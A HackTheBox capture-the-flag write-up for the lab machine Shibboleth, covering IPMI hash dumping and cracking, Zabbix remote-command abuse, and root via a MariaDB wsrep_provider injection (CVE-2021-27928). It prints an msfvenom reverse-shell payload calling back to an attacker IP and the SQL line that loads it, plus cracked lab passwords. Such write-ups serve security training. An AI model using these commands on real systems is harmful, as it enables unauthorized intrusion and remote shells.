---
title: "Shibboleth Hackthebox writeup"
author: "0xMesbaha"
cover: "/media/shibboleth/20220401204521.png"
tags: ["Hackthebox", "ipmi", "maria-DB", "zabbix"]
date: 2022-04-01T00:49:18+18:08
draft: false
---

In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version

<!--more-->

# Scanning :

basic scanning :

```bash
nmap -A -T4 10.10.11.124

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

it was suspicious to have only this port , so i performed a udp scan as well :

```bash
sudo nmap -sU 10.10.11.124

PORT    STATE SERVICE
623/udp open  asf-rmcp
```

we can add `shibboleth.htb` to the `/etc/hosts` and move on to enumeration

# Enumeration :

we can start performing some vhost enumeration :

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb"  -fc 302

monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
```

and add them to the `/etc/hosts` as well

```
10.10.11.124	shibboleth.htb	monitor.shibboleth.htb	zabbix.shibboleth.htb
```

the UDP port we have found eariler seems worthy to search for , and you can find [this](https://book.hacktricks.xyz/pentesting/623-udp-ipmi) post from Hacktricks

we can use that to find the version first

![error](/media/shibboleth/20220401205846.png)

then we can try that :

![error](/media/shibboleth/20220401205951.png)

seems to be `IPMI-2.0 UserAuth ` , from the same post we can see :

![error](/media/shibboleth/20220401210253.png)

we can try that :

![error](/media/shibboleth/20220401210325.png)

and it retrieves a hash , we can see if we can crack it.

from hashcat wiki [here](https://hashcat.net/wiki/doku.php?id=example_hashes)

![error](/media/shibboleth/20220401210453.png)

```bash
hashcat -m 7300 hash2 /usr/share/wordlists/rockyou.txt
```

![error](/media/shibboleth/20220401210621.png)

so now we have these credentials `Administrator:ilovepumkinpie1`

after this point i performed some enumeration to the `IPMI` like :

```bash
ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P ilovepumkinpie1  user list
```

and other But seems i went so far from the foothold :(

now we can take a look at the `TCP port 80` we have found earlier

**`shibboleth.htb`** is not interesting at all , all pages are static

![error](/media/shibboleth/20220401211105.png)

**`zabbix.shibboleth.htb`** has login page so obviously i tried the credentials we have

![error](/media/shibboleth/20220401211214.png)

and we are in :

![error](/media/shibboleth/20220401211319.png)

# Foothold:

if you look at the footer you will find the zabbix version:

![error](/media/shibboleth/20220401211354.png)

searching for it i found no exploits , you can start doing your research and will find at the documentation [here](https://www.zabbix.com/documentation/5.4/en/manual/config/notifications/action/operation/remote_command) the web interface can execute remote commands

actually to exploit it you will do a lot of searching in different options at the web page until you find the page.

at this time i was practicing python so why not to write my first published exploit ?

![](https://media.giphy.com/media/3MkhtxEKImJL3HbRzE/giphy.gif)

you will find it [here](https://www.exploit-db.com/exploits/50816)

![error](/media/shibboleth/20220401212257.png)

so let's download it and try using the exploit

![error](/media/shibboleth/20220401212449.png)

and after one minute:

![error](/media/shibboleth/20220401212602.png)

# Privilege escalation:

only one user exist which is `ipmi_svc` , and we have the password from the `ipmi` right , worthy trying it :

![error](/media/shibboleth/20220401212805.png)

and it works

# Root Access

Uploading Linpeas to the Box and start investigating the output :

![error](/media/shibboleth/20220401213204.png)

![error](/media/shibboleth/20220401213240.png)

![error](/media/shibboleth/20220401213444.png)

and as we can see Maria DB is running locally only , and we can see [linpeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220401/linpeas.sh) found the username and the password to connect to the database, we can try interact with it

we can read the file except the comments , hence it won't be applicable

```bash
cat /etc/zabbix/zabbix_server.conf | grep -v "#"
```

![error](/media/shibboleth/20220401214523.png)

now let's try interact with it :

```bash
 # password :bloooarskybluh
 mysql -u zabbix -D zabbix -p
```

and we are in :

![error](/media/shibboleth/20220401214650.png)

this Maria-DB version we see at the banner is Vulnerable to **`OS command injection`** , and we can find the exploit [here](https://github.com/Al1ex/CVE-2021-27928)

following the steps:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.52 LPORT=1337 -f elf-so -o CVE-2021-27928.so
```

set the listener and move the `.so` file to the Box. then on the box login to the database then :

```bash
MariaDB [zabbix]> SET GLOBAL wsrep_provider="/dev/shm/CVE-2021-27928.so";
```

![error](/media/shibboleth/20220401215308.png)
